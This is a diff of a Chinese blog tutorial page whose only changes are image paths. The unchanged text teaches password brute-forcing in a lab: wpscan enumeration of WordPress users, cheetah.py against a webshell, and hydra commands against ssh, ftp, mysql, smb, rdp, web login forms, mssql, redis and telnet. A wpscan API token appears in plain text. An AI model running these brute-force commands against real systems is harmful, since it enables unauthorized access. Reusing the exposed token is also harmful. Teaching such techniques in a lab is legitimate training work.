@@ -518,26 +518,26 @@ python cheetah.py -u ht">
 <p>-v 详细信息</p>
 <p>-p 字典位置</p>
 </blockquote>
-<p><img src="./60%E4%B9%8Bday21/image-20210802125301337.png" alt="image-20210802125301337"></p>
+<p><img src="/2021/08/02/60-zhi-day21/image-20210802125301337.png" alt="image-20210802125301337"></p>
 <p>再文件夹位置运行终端执行</p>
 <p>python cheetah.py -u <a target="_blank" rel="noopener" href="http://www.c1moon.com/cmd.php">http://www.c1moon.com/cmd.php</a> -r post -n 1000 -v</p>
-<p><img src="./60%E4%B9%8Bday21/image-20210802125631803.png" alt="image-20210802125631803"></p>
+<p><img src="/2021/08/02/60-zhi-day21/image-20210802125631803.png" alt="image-20210802125631803"></p>
 <p>扫面结果再data里的find.list查看</p>
-<p><img src="./60%E4%B9%8Bday21/image-20210802125843196.png" alt="image-20210802125843196"></p>
+<p><img src="/2021/08/02/60-zhi-day21/image-20210802125843196.png" alt="image-20210802125843196"></p>
 <h2 id="wordpress-博客系统用户密码穷举"><a href="#wordpress-博客系统用户密码穷举" class="headerlink" title="wordpress 博客系统用户密码穷举"></a>wordpress 博客系统用户密码穷举</h2><p>wordpress 是知名的博客系统，在互联网上的占有量很大，所以一定要知道这套系统的弱口令穷举的方法。</p>
 <p><a target="_blank" rel="noopener" href="https://wpscan.com/">https://wpscan.com</a> 首先到这个网站注册账号和密码注册后获取 token</p>
 <p>配置了kali的dns和host</p>
 <p><strong>自动找账号信息</strong></p>
 <p>wpscan –url <a target="_blank" rel="noopener" href="http://www.redteam.com/">http://www.redteam.com/</a> -e u -P /root/top100password.txt –api-token xvA9gb6k7XgLGYMkhu8YBsLUHwfpWRvllISDppfwYDE</p>
-<p><img src="./60%E4%B9%8Bday21/image-20210802132104577.png" alt="image-20210802132104577"></p>
-<p><img src="./60%E4%B9%8Bday21/image-20210802132121759.png" alt="image-20210802132121759"></p>
+<p><img src="/2021/08/02/60-zhi-day21/image-20210802132104577.png" alt="image-20210802132104577"></p>
+<p><img src="/2021/08/02/60-zhi-day21/image-20210802132121759.png" alt="image-20210802132121759"></p>
 <p><strong>手动收集 wordpress 用户信息 访问连接获取用户信息</strong></p>
 <p><a target="_blank" rel="noopener" href="http://www.redteam.com/wp-json/wp/v2/users">http://www.redteam.com/wp-json/wp/v2/users</a></p>
-<p><img src="./60%E4%B9%8Bday21/image-20210802132555565.png" alt="image-20210802132555565"></p>
+<p><img src="/2021/08/02/60-zhi-day21/image-20210802132555565.png" alt="image-20210802132555565"></p>
 <p>这里实在物理机看的 没配dns解析 应该是admin和moonsec</p>
 <p>获取信息可以再进行指定用户爆破</p>
 <p>wpscan –url <a target="_blank" rel="noopener" href="http://www.redteam.com/">http://www.redteam.com/</a> -U moonsec -P /root/top100password.txt –api-token xvA9gb6k7XgLGYMkhu8YBsLUHwfpWRvllISDppfwYDE</p>
-<p><img src="./60%E4%B9%8Bday21/image-20210802132844496.png" alt="image-20210802132844496"></p>
+<p><img src="/2021/08/02/60-zhi-day21/image-20210802132844496.png" alt="image-20210802132844496"></p>
 <h2 id="常见的端口服务穷举"><a href="#常见的端口服务穷举" class="headerlink" title="常见的端口服务穷举"></a>常见的端口服务穷举</h2><h3 id="hydra密码穷举工具的使用"><a href="#hydra密码穷举工具的使用" class="headerlink" title="hydra密码穷举工具的使用"></a>hydra密码穷举工具的使用</h3><p>hydra(九头蛇) 是一个端口穷举服务器的工具</p>
 <blockquote>
 <p>可以扫描以下服务</p>
@@ -576,75 +576,75 @@ python cheetah.py -u ht">
 <p>可选项</p>
 <h3 id="hydra-穷举-ssh-服务"><a href="#hydra-穷举-ssh-服务" class="headerlink" title="hydra 穷举 ssh 服务"></a>hydra 穷举 ssh 服务</h3><p>-L 用户字典文件 -P 密码字典文件 -t 线程数 -vV 详细信息 -e ns 使用空口令使用指定用户和密码试探 192.168.163.143 你要穷举的 ip ssh 是服务 -o 保存文件-f 如果找到马上中断扫描</p>
 <p>我们可以使用nmap查看ssh对应的22端口是否开放</p>
-<p><img src="./60%E4%B9%8Bday21/image-20210802184443404.png" alt="image-20210802184443404"></p>
+<p><img src="/2021/08/02/60-zhi-day21/image-20210802184443404.png" alt="image-20210802184443404"></p>
 <p>我们使用如下的命令</p>
 <p>hydra -l root -P /root/top100.txt -e ns -vV -t 1 -f 192.168.163.143 ssh </p>
-<p><img src="./60%E4%B9%8Bday21/image-20210802184621404.png" alt="image-20210802184621404"></p>
+<p><img src="/2021/08/02/60-zhi-day21/image-20210802184621404.png" alt="image-20210802184621404"></p>
 <p>设置了-f，所以跑到正确的密码就会停下来高亮</p>
 <p>类似这种</p>
-<p><img src="./60%E4%B9%8Bday21/image-20210802184820329.png" alt="image-20210802184820329"></p>
+<p><img src="/2021/08/02/60-zhi-day21/image-20210802184820329.png" alt="image-20210802184820329"></p>
 <p>这是指定用户的，我们也可以编辑一个user.txt，扫描多个用户</p>
 <p>我们再user.txt写上root和moonsec，用大写L即可</p>
 <p>hydra -L user.txt -P /root/top100.txt -e ns -vV -t 1 -f 192.168.163.143 ssh </p>
-<p><img src="./60%E4%B9%8Bday21/image-20210802185240140.png" alt="image-20210802185240140"></p>
+<p><img src="/2021/08/02/60-zhi-day21/image-20210802185240140.png" alt="image-20210802185240140"></p>
 <h3 id="hydra-穷举-ftp-服务"><a href="#hydra-穷举-ftp-服务" class="headerlink" title="hydra 穷举 ftp 服务"></a>hydra 穷举 ftp 服务</h3><p>hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认 16) -vV</p>
 <p>hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV</p>
 <p>我们可以看到靶机存在ftp服务，成功登录了</p>
-<p><img src="./60%E4%B9%8Bday21/image-20210802185700425.png" alt="image-20210802185700425"></p>
+<p><img src="/2021/08/02/60-zhi-day21/image-20210802185700425.png" alt="image-20210802185700425"></p>
 <p>用此命令穷举</p>
 <p>hydra -l c5moon -P /root/top100.txt -e ns -vV 192.168.163.139 ftp  </p>
-<p><img src="./60%E4%B9%8Bday21/image-20210802185548817.png" alt="image-20210802185548817"></p>
+<p><img src="/2021/08/02/60-zhi-day21/image-20210802185548817.png" alt="image-20210802185548817"></p>
 <h3 id="hydra-穷举-mysql-服务"><a href="#hydra-穷举-mysql-服务" class="headerlink" title="hydra 穷举 mysql 服务"></a>hydra 穷举 mysql 服务</h3><p>hydra ip mysql -l 用户名 -P 密码字典 -t 线程(默认 16) -vV</p>
 <p>hydra ip mysql -l 用户名 -P 密码字典 -e ns -vV</p>
 <p>hydra ip mysql -l 用户名 -P 密码字典 -e ns -vV -s 端口</p>
 <p>在靶机上我们开了mysql</p>
-<p><img src="./60%E4%B9%8Bday21/image-20210802190148824.png" alt="image-20210802190148824"></p>
+<p><img src="/2021/08/02/60-zhi-day21/image-20210802190148824.png" alt="image-20210802190148824"></p>
 <p>hydra -l root -P /root/top100.txt -e ns -vV -f  192.168.0.127 mysql</p>
-<p><img src="./60%E4%B9%8Bday21/image-20210802190206693.png" alt="image-20210802190206693"></p>
+<p><img src="/2021/08/02/60-zhi-day21/image-20210802190206693.png" alt="image-20210802190206693"></p>
 <h3 id="hydra-穷举-smb-服务"><a href="#hydra-穷举-smb-服务" class="headerlink" title="hydra 穷举 smb 服务"></a>hydra 穷举 smb 服务</h3><p>我们用nmap看下靶机445端口是否开放</p>
 <p>nmap -p 445 192.168.0.127</p>
-<p><img src="./60%E4%B9%8Bday21/image-20210802190524879.png" alt="image-20210802190524879"></p>
+<p><img src="/2021/08/02/60-zhi-day21/image-20210802190524879.png" alt="image-20210802190524879"></p>
 <p>靶机上查看也是开放的</p>
-<p><img src="./60%E4%B9%8Bday21/image-20210802190606146.png" alt="image-20210802190606146"></p>
+<p><img src="/2021/08/02/60-zhi-day21/image-20210802190606146.png" alt="image-20210802190606146"></p>
 <p><strong>单个穷举</strong></p>
 <p>hydra -l administrator -P /root/top100.txt -e ns -vV -f  192.168.0.127 smb</p>
-<p><img src="./60%E4%B9%8Bday21/image-20210802190815658.png" alt="image-20210802190815658"></p>
+<p><img src="/2021/08/02/60-zhi-day21/image-20210802190815658.png" alt="image-20210802190815658"></p>
 <p>我们可以通过此端口在物理机连接靶机</p>
-<p><img src="./60%E4%B9%8Bday21/image-20210802191222878.png" alt="image-20210802191222878"></p>
+<p><img src="/2021/08/02/60-zhi-day21/image-20210802191222878.png" alt="image-20210802191222878"></p>
 <p><strong>批量穷举</strong></p>
 <p>我们俩个靶机都开放了445端口，我们来批量扫描</p>
 <p>我们把俩个ip写在ip.txt里面，通过-M参数来穷举</p>
-<p><img src="./60%E4%B9%8Bday21/image-20210802191653798.png" alt="image-20210802191653798"></p>
+<p><img src="/2021/08/02/60-zhi-day21/image-20210802191653798.png" alt="image-20210802191653798"></p>
 <p>hydra -l administrator -P /root/top100.txt -e ns -vV -f  -M ip.txt  smb </p>
-<p><img src="./60%E4%B9%8Bday21/image-20210802191827255.png" alt="image-20210802191827255"></p>
-<p><img src="./60%E4%B9%8Bday21/image-20210802191841714.png" alt="image-20210802191841714"></p>
+<p><img src="/2021/08/02/60-zhi-day21/image-20210802191827255.png" alt="image-20210802191827255"></p>
+<p><img src="/2021/08/02/60-zhi-day21/image-20210802191841714.png" alt="image-20210802191841714"></p>
 <p>可以通过-o参数把结果写在一个文件里</p>
 <p>hydra -l administrator -P /root/top100.txt -e ns -vV -f  -M ip.txt  smb -o smb.txt</p>
-<p><img src="./60%E4%B9%8Bday21/image-20210802191947897.png" alt="image-20210802191947897"></p>
+<p><img src="/2021/08/02/60-zhi-day21/image-20210802191947897.png" alt="image-20210802191947897"></p>
 <h3 id="hydra-穷举-rdp-服务"><a href="#hydra-穷举-rdp-服务" class="headerlink" title="hydra 穷举 rdp 服务"></a>hydra 穷举 rdp 服务</h3><p>rdp远程终端，可以远征连接靶机</p>
 <p>我们现在俩个靶机上看是否开放了rdp服务</p>
-<p><img src="./60%E4%B9%8Bday21/image-20210802192236857.png" alt="image-20210802192236857"></p>
-<p><img src="./60%E4%B9%8Bday21/image-20210802192302683.png" alt="image-20210802192302683"></p>
+<p><img src="/2021/08/02/60-zhi-day21/image-20210802192236857.png" alt="image-20210802192236857"></p>
+<p><img src="/2021/08/02/60-zhi-day21/image-20210802192302683.png" alt="image-20210802192302683"></p>
 <p>hydra -l administrator -P /root/top100.txt -e ns -vV -f  -M ip.txt  rdp</p>
-<p><img src="./60%E4%B9%8Bday21/image-20210802192647875.png" alt="image-20210802192647875"></p>
-<p><img src="./60%E4%B9%8Bday21/image-20210802192701423.png" alt="image-20210802192701423"></p>
+<p><img src="/2021/08/02/60-zhi-day21/image-20210802192647875.png" alt="image-20210802192647875"></p>
+<p><img src="/2021/08/02/60-zhi-day21/image-20210802192701423.png" alt="image-20210802192701423"></p>
 <p>我们可以通过账号远程连接靶机</p>
-<p><img src="./60%E4%B9%8Bday21/image-20210802192726942.png" alt="image-20210802192726942"></p>
-<p><img src="./60%E4%B9%8Bday21/image-20210802192738422.png" alt="image-20210802192738422"></p>
-<p><img src="./60%E4%B9%8Bday21/image-20210802192817352.png" alt="image-20210802192817352"></p>
+<p><img src="/2021/08/02/60-zhi-day21/image-20210802192726942.png" alt="image-20210802192726942"></p>
+<p><img src="/2021/08/02/60-zhi-day21/image-20210802192738422.png" alt="image-20210802192738422"></p>
+<p><img src="/2021/08/02/60-zhi-day21/image-20210802192817352.png" alt="image-20210802192817352"></p>
 <h3 id="hydra穷举-http-服务"><a href="#hydra穷举-http-服务" class="headerlink" title="hydra穷举 http 服务"></a>hydra穷举 http 服务</h3><p>eg：</p>
 <p>hydra -l admin -P 2019_top100.txt -vV -f <a target="_blank" rel="noopener" href="http://www.c1moon.com/">www.c1moon.com</a> http-post-form”/admin/index.php:user=^USER^&amp;ps=^PASS^&amp;action=login:login-error”</p>
 <p>我们用如下命令穷举</p>
 <p>hydra -l admin -P /root/top100.txt -vV -f <a target="_blank" rel="noopener" href="http://www.c1moon.com/">www.c1moon.com</a> http-post-form “/admin/index.php:user=^USER^&amp;ps=^PASS^&amp;action=login:login-error”</p>
-<p><img src="./60%E4%B9%8Bday21/image-20210802193148396.png" alt="image-20210802193148396"></p>
+<p><img src="/2021/08/02/60-zhi-day21/image-20210802193148396.png" alt="image-20210802193148396"></p>
 <h3 id="hydra穷举mssql服务"><a href="#hydra穷举mssql服务" class="headerlink" title="hydra穷举mssql服务"></a>hydra穷举mssql服务</h3><p>mssql即sql server </p>
 <p>使用如下命令</p>
 <p>hydra -l sa -P /root/top100.txt -e ns -vV -f 192.168.0.127 mssql</p>
-<p><img src="./60%E4%B9%8Bday21/image-20210802194209202.png" alt="image-20210802194209202"></p>
+<p><img src="/2021/08/02/60-zhi-day21/image-20210802194209202.png" alt="image-20210802194209202"></p>
 <h3 id="hydra穷举redis服务"><a href="#hydra穷举redis服务" class="headerlink" title="hydra穷举redis服务"></a>hydra穷举redis服务</h3><p>俩个靶机都开放了redis，redis没有用户名，我们把l参数删掉即可</p>
 <p>使用如下命令批量穷举</p>
 <p>hydra -P /root/top100.txt -e ns -vV -f -M ip.txt redis   </p>
-<p><img src="./60%E4%B9%8Bday21/image-20210802194401230.png" alt="image-20210802194401230"></p>
+<p><img src="/2021/08/02/60-zhi-day21/image-20210802194401230.png" alt="image-20210802194401230"></p>
 <h3 id="hydra-穷举-pop3-服务"><a href="#hydra-穷举-pop3-服务" class="headerlink" title="hydra 穷举 pop3 服务"></a>hydra 穷举 pop3 服务</h3><p>hydra -L user.txt -P qweasd123 192.168.52.6 smtp-vV -f</p>
 <h3 id="hydra-穷举-http-proxy-服务"><a href="#hydra-穷举-http-proxy-服务" class="headerlink" title="hydra 穷举 http-proxy 服务"></a>hydra 穷举 http-proxy 服务</h3><p>hydra -l admin -P pass.txt http-proxy://10.36.16.18</p>
 <h3 id="hydra-穷举-imap-服务"><a href="#hydra-穷举-imap-服务" class="headerlink" title="hydra 穷举 imap 服务"></a>hydra 穷举 imap 服务</h3><p>hydra -L user.txt -p secret 10.36.16.18 imap PLAIN</p>
@@ -652,14 +652,14 @@ python cheetah.py -u ht">
 <h3 id="hydra-穷举-telnet-服务"><a href="#hydra-穷举-telnet-服务" class="headerlink" title="hydra 穷举 telnet 服务"></a>hydra 穷举 telnet 服务</h3><p>hydra ip telnet -l 用户 -P 密码字典 -t 32 -s 23 -e ns -f -V</p>
 <h2 id="xhydra穷举工具"><a href="#xhydra穷举工具" class="headerlink" title="xhydra穷举工具"></a>xhydra穷举工具</h2><p>xhydra 是 hydra 的可视化工具 使用简单方便快捷。kali终端输入 xhydra 即可使用。</p>
 <p>基本界面如下</p>
-<p><img src="./60%E4%B9%8Bday21/image-20210802195823344.png" alt="image-20210802195823344"></p>
-<p><img src="./60%E4%B9%8Bday21/image-20210802195908440.png" alt="image-20210802195908440"></p>
-<p><img src="./60%E4%B9%8Bday21/image-20210802195942339.png" alt="image-20210802195942339"></p>
-<p><img src="./60%E4%B9%8Bday21/image-20210802200041383.png" alt="image-20210802200041383"></p>
-<p><img src="./60%E4%B9%8Bday21/image-20210802200051810.png" alt="image-20210802200051810"></p>
+<p><img src="/2021/08/02/60-zhi-day21/image-20210802195823344.png" alt="image-20210802195823344"></p>
+<p><img src="/2021/08/02/60-zhi-day21/image-20210802195908440.png" alt="image-20210802195908440"></p>
+<p><img src="/2021/08/02/60-zhi-day21/image-20210802195942339.png" alt="image-20210802195942339"></p>
+<p><img src="/2021/08/02/60-zhi-day21/image-20210802200041383.png" alt="image-20210802200041383"></p>
+<p><img src="/2021/08/02/60-zhi-day21/image-20210802200051810.png" alt="image-20210802200051810"></p>
 <p>我们尝试穷举rdp服务如下：</p>
-<p><img src="./60%E4%B9%8Bday21/image-20210802195703423.png" alt="image-20210802195703423"></p>
-<p><img src="./60%E4%B9%8Bday21/image-20210802200138453.png" alt="image-20210802200138453"></p>
+<p><img src="/2021/08/02/60-zhi-day21/image-20210802195703423.png" alt="image-20210802195703423"></p>
+<p><img src="/2021/08/02/60-zhi-day21/image-20210802200138453.png" alt="image-20210802200138453"></p>
 
                 
             </div>
